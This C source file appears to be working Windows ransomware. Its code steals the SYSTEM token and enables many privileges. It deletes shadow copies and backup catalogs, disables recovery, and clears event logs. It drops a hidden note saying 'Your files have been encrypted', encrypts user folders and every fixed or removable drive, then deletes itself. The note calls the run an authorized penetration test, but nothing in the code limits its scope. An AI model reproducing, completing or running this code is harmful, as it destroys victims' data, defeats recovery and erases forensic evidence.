#include "utils.h"
#include "fileops.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <lm.h>

void ElevatePrivileges(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;

    const char *privs[] = {
        "SeDebugPrivilege", "SeBackupPrivilege", "SeRestorePrivilege",
        "SeTakeOwnershipPrivilege", "SeShutdownPrivilege",
        "SeLoadDriverPrivilege", "SeSystemtimePrivilege",
        "SeIncreaseQuotaPrivilege", "SeTcbPrivilege",
        NULL
    };

    for (int i = 0; privs[i]; i++) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
    }
    CloseHandle(hToken);

    /* Try to steal SYSTEM token (PID 4) */
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 4);
    if (hProc) {
        HANDLE hSysToken;
        if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hSysToken)) {
            HANDLE hDupToken;
            DuplicateTokenEx(hSysToken, MAXIMUM_ALLOWED, NULL,
                             SecurityImpersonation, TokenPrimary, &hDupToken);
            ImpersonateLoggedOnUser(hSysToken);
            if (hDupToken) CloseHandle(hDupToken);
            CloseHandle(hSysToken);
        }
        CloseHandle(hProc);
    }
}

void NukeBackups(void) {
    /* Disable System Restore */
    HKEY hk;
    DWORD val = 1;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\System\\Restore", 0, KEY_SET_VALUE, &hk);
    RegSetValueExA(hk, "DisableSR", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableConfig", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);

    const char *cmds[] = {
        "vssadmin delete shadows /all /quiet",
        "wmic shadowcopy delete",
        "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=1MB",
        "bcdedit /set {default} recoveryenabled No",
        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        "wbadmin delete catalog -quiet",
        "fsutil usn deletejournal /D C:",
        "wevtutil cl Application",
        "wevtutil cl Security",
        "wevtutil cl System",
        "del /s /f /q C:\\*.log",
        "del /s /f /q C:\\*.evtx"
    };

    for (int i = 0; i < sizeof(cmds) / sizeof(cmds[0]); i++) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        char *cmdCopy = _strdup(cmds[i]);
        if (cmdCopy) {
            CreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW | IDLE_PRIORITY_CLASS,
                           NULL, NULL, &si, &pi);
            WaitForSingleObject(pi.hProcess, 3000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            free(cmdCopy);
        }
    }
}

void DropNote(void) {
    char compName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    char userName[256] = {0};
    DWORD sz = sizeof(compName);
    DWORD usz = 256;
    GetComputerNameA(compName, &sz);
    GetUserNameA(userName, &usz);

    char systemInfo[4096];
    snprintf(systemInfo, sizeof(systemInfo),
        "\r\n"
        "  ==========================================\r\n"
        "  PENETRATION TEST - AUTHORIZED ASSESSMENT\r\n"
        "  ==========================================\r\n"
        "\r\n"
        "  Machine:     %s\r\n"
        "  User:        %s\r\n"
        "  Date:        %s (%s)\r\n"
        "\r\n"
        "  Your files have been encrypted.\r\n"
        "  This system has been successfully assessed.\r\n"
        "  All actions were authorized per the testing agreement.\r\n"
        "\r\n"
        "  Contact: https://github.com/jahanzaibmir\r\n"
        "\r\n"
        "  ==========================================\r\n"
        "\r\n",
        compName, userName, __DATE__, __TIME__);

    /* Desktop */
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
    char fp[MAX_PATH * 2];
    snprintf(fp, sizeof(fp), "%s\\PENTEST_RESULTS.txt", path);
    HANDLE hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hF != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hF, systemInfo, strlen(systemInfo), &w, NULL);
        CloseHandle(hF);
    }

    /* Common Desktop */
    SHGetFolderPathA(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, NULL, 0, path);
    snprintf(fp, sizeof(fp), "%s\\PENTEST_RESULTS.txt", path);
    hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                     CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hF != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hF, systemInfo, strlen(systemInfo), &w, NULL);
        CloseHandle(hF);
    }

    /* Drive roots */
    for (char d = 'C'; d <= 'Z'; d++) {
        char root[4] = {d, ':', '\\', 0};
        UINT dt = GetDriveTypeA(root);
        if (dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE) {
            snprintf(fp, sizeof(fp), "%sPENTEST_RESULTS.txt", root);
            hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
            if (hF != INVALID_HANDLE_VALUE) {
                DWORD w;
                WriteFile(hF, systemInfo, strlen(systemInfo), &w, NULL);
                CloseHandle(hF);
            }
        }
    }
}

void SelfDelete(void) {
    char exeP[MAX_PATH];
    GetModuleFileNameA(NULL, exeP, MAX_PATH);
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "cmd /c timeout /t 3 & del /f /q \"%s\"", exeP);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

unsigned __stdcall EncryptionWorker(void *arg) {
    (void)arg;
    char buf[MAX_PATH];

    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, buf) == S_OK)
        EncryptDirectory(buf, 0);
    if (SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, buf) == S_OK)
        EncryptDirectory(buf, 0);
    if (SHGetFolderPathA(NULL, 0x0015, NULL, 0, buf) == S_OK)  /* Downloads */
        EncryptDirectory(buf, 0);

    /* Drives */
    for (char d = 'C'; d <= 'Z'; d++) {
        char root[4] = {d, ':', '\\', 0};
        UINT dt = GetDriveTypeA(root);
        if (dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE)
            EncryptDirectory(root, 0);
    }
    return 0;
}